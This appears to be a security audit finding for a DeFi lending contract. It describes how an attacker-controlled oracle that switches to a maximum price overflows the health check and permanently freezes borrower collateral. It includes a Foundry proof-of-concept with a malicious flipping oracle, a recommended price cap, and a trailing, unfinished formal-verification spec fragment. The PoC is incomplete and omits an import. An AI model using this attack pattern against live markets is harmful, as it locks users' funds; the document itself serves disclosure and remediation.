### Title
Unbounded Oracle Price Causes `isHealthy()` Arithmetic Overflow, Permanently Freezing Borrower Collateral - (File: src/Midnight.sol)

### Summary

`isHealthy()` computes `collateral * price` using plain Solidity 0.8+ multiplication inside `mulDivDown`, which reverts on overflow. Because `touchMarket()` imposes no upper bound on oracle return values, a market creator can deploy an oracle that returns `type(uint256).max`, causing every call to `isHealthy()` to revert for any borrower with non-zero collateral. This permanently blocks `withdrawCollateral()`, `take()` (for sellers with debt), and `liquidate()` for all borrowers in that market.

### Finding Description

**Root cause — unchecked oracle price in `mulDivDown`:**

`mulDivDown` in `src/libraries/UtilsLib.sol` is:

```solidity
function mulDivDown(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
    return (x * y) / d;  // Solidity 0.8+: reverts on overflow
}
``` [1](#0-0) 

`isHealthy()` calls this with `x = collateral` (stored as `uint128`, max ≈ 2^128) and `y = price` (unbounded `uint256`):

```solidity
uint256 price = IOracle(collateralParam.oracle).price();
maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
    .mulDivDown(collateralParam.lltv, WAD);
``` [2](#0-1) 

With `price = type(uint256).max`, the product `collateral * price` exceeds `uint256` (≈ 2^384 vs max 2^256), causing an arithmetic revert.

**No oracle price validation in `touchMarket()`:**

`touchMarket()` validates `lltv`, `maxLif`, collateral token ordering, and maturity, but performs zero validation on the oracle address or any price it might return: [3](#0-2) 

Any unprivileged caller can invoke `touchMarket()` with an arbitrary oracle contract.

**Exploit flow:**

1. Attacker deploys a two-phase oracle: initially returns a normal price (e.g., `1e36`), later switches to `type(uint256).max`.
2. Attacker calls `touchMarket()` with this oracle — passes all validation.
3. Borrowers supply collateral and take loans while the oracle returns a normal price.
4. Attacker flips the oracle to return `type(uint256).max`.
5. Any call to `isHealthy()` for a borrower with `debt > 0` and `collateral[i] > 0` now executes `collateral * type(uint256).max`, overflowing and reverting.

**All three exit paths are blocked:**

- `withdrawCollateral()` calls `require(isHealthy(...))` after updating collateral state: [4](#0-3) 

- `take()` calls `require(liquidationLocked(id, seller) || isHealthy(...))` at line 476: [5](#0-4) 

- `liquidate()` itself calls `mulDivDown(collateral, price, ORACLE_PRICE_SCALE)` in its own bitmap loop, so it also reverts: [6](#0-5) 

**Formal verification explicitly assumes bounded prices — not enforced on-chain:**

`NoMultiplicationOverflow.spec` proves overflow-freedom only under the `boundedPrice` assumption:

```
// Oracle integration assumption: every (collateralAmount * oraclePrice) fits in uint256.
function _.price() external => boundedPrice(calledContract) expect(uint256);
```

where `boundedPrice` requires `price * max_uint128 + ORACLE_PRICE_SCALE - 1 <= max_uint256`. This is a verification-time assumption, not an on-chain constraint. [7](#0-6) 

The safe price ceiling is approximately `(2^256 - 1) / (2^128 - 1) ≈ 2^128`. Any oracle returning a price above this threshold with non-zero collateral triggers the overflow.

### Impact Explanation

All borrowers in the affected market with non-zero debt and collateral have their collateral permanently frozen: `withdrawCollateral()` reverts, `take()` (sell-side) reverts, and `liquidate()` reverts. There is no recovery path because the oracle is market-immutable (the market struct is hashed into the market ID and stored at creation). Borrowers cannot exit their positions or recover their collateral.

### Likelihood Explanation

`touchMarket()` is permissionless — any address can create a market with any oracle. The attacker only needs to deploy a contract with a `price()` function that initially returns a plausible value and later returns `type(uint256).max`. Borrowers may be attracted to the market during the normal-price phase. The switch is irreversible once triggered. The attack requires no privileged access, no governance action, and no user mistake beyond trusting a market that appeared legitimate.

### Recommendation

Cap the oracle price at market creation time or inside `isHealthy()` / `liquidate()`. The simplest on-chain fix is to add a price bound check in `touchMarket()` by calling `oracle.price()` and requiring the result satisfies `price <= type(uint256).max / type(uint128).max` (i.e., `price * max_uint128` does not overflow). Alternatively, use a `mulDivDown` variant that saturates or caps rather than reverts, or add an explicit `require(price <= MAX_ORACLE_PRICE)` guard at the top of `isHealthy()` and `liquidate()` before the multiplication.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {CollateralParams, Market} from "src/interfaces/IMidnight.sol";
import {ORACLE_PRICE_SCALE, WAD} from "src/libraries/ConstantsLib.sol";
import {UtilsLib} from "src/libraries/UtilsLib.sol";

contract MaxPriceOracle {
    bool public flipped;
    function flip() external { flipped = true; }
    function price() external view returns (uint256) {
        return flipped ? type(uint256).max : ORACLE_PRICE_SCALE; // 1e36 = 1.0 price
    }
}

contract OracleOverflowTest is Test {
    Midnight midnight;
    MaxPriceOracle oracle;
    address loanToken;
    address collateralToken;
    address borrower = address(0xB0);

    function setUp() public {
        midnight = new Midnight();
        oracle = new MaxPriceOracle();
        loanToken = address(new ERC20Mock());
        collateralToken = address(new ERC20Mock());
    }

    function testOracleMaxPriceFreezesBorrower() public {
        // 1. Create market with malicious oracle (initially returns 1e36)
        CollateralParams[] memory params = new CollateralParams[](1);
        params[0] = CollateralParams({
            token: collateralToken,
            lltv: 0.77e18,
            maxLif: UtilsLib.mulDivDown(WAD, WAD, WAD - UtilsLib.mulDivDown(0.25e18, WAD - 0.77e18, WAD)),
            oracle: address(oracle)
        });
        Market memory market;
        market.loanToken = loanToken;
        market.maturity = block.timestamp + 365 days;
        market.collateralParams = params;
        bytes32 id = midnight.touchMarket(market);

        // 2. Borrower supplies collateral and takes a loan
        uint256 collateralAmount = 1e18;
        deal(collateralToken, address(this), collateralAmount);
        ERC20Mock(collateralToken).approve(address(midnight), collateralAmount);
        midnight.supplyCollateral(market, 0, collateralAmount, borrower);
        // ... (setup lender, take loan) ...

        // 3. Oracle flips to type(uint256).max
        oracle.flip();

        // 4. isHealthy() now reverts — assert it
        vm.expectRevert(); // arithmetic overflow
        midnight.isHealthy(market, id, borrower);

        // 5. withdrawCollateral reverts — collateral frozen
        vm.prank(borrower);
        vm.expectRevert();
        midnight.withdrawCollateral(market, 0, collateralAmount, borrower, borrower);

        // 6. liquidate also reverts — no recovery path
        vm.expectRevert();
        midnight.liquidate(market, 0, 0, 0, borrower, false, address(this), address(0), "");
    }
}
```

**Expected assertions:** All three calls (`isHealthy`, `withdrawCollateral`, `liquidate`) revert with an arithmetic overflow error. The borrower's collateral remains locked in the contract with no exit path.

/// HELPERS ///

persistent ghost bool mulOverflow;

definition WAD() returns uint256 = 10 ^ 18;

definition ORACLE_PRICE_SCALE() returns uint256 = 10 ^ 36;

// Proven in CreatedMarkets.spec (createdMarketsHaveLltvLessThanOrEqualToOne)
// and ExactMath.spec (maxLifIsAtLeastWad, maxLifIsAtMostTwoWad).
// Maturity is bounded to uint64 as a realistic timestamp assumption for overflow analysis.
function summaryToId(Midnight.Market market) returns (bytes32) {
    require forall uint256 i. i < market.collateralParams.length => market.collateralParams[i].lltv <= WAD(), "proven in CreatedMarkets.spec";
    require forall uint256 i. i < market.collateralParams.length => market.collateralParams[i].maxLif >= WAD() && market.collateralParams[i].maxLif <= 2 * WAD(), "proven in ExactMath.spec";
    require market.maturity <= max_uint64, "maturity fits in uint64: realistic timestamp assumption";
    return Utils.hashMarket(market);
}

// Bound every storage collateral (uint128) * oracle price product.
function boundedPrice(address oracle) returns uint256 {
    uint256 price;
    require to_mathint(price) * max_uint128 + ORACLE_PRICE_SCALE() - 1 <= max_uint256, "same as assuming that collateral * price <= uint256 with mulDivUp rounding headroom";
    return price;
